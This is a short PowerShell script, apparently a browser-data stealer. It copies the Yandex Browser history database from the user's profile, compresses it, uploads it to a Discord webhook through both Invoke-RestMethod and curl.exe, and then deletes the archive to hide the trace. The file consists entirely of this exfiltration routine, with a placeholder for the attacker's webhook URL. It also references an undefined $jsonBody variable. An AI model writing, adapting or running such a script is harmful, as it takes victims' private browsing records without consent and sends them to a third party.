# Your Discord webhook URL
$discordWebhookUrl = "<DISCORD_WEBHOOK_URL>"

$chromeHistoryPath = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\History"

$destinationFolder = "C:\Temp"

$archiveFileName = "YandexHistoryArchive.zip"

$archiveFilePath = Join-Path $destinationFolder $archiveFileName

Compress-Archive -Path $chromeHistoryPath -DestinationPath $archiveFilePath -Force

Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $jsonBody -ContentType "application/json"

& curl.exe -F "file1=@$archiveFilePath" $discordWebhookUrl

Remove-Item -Path $archiveFilePath -Force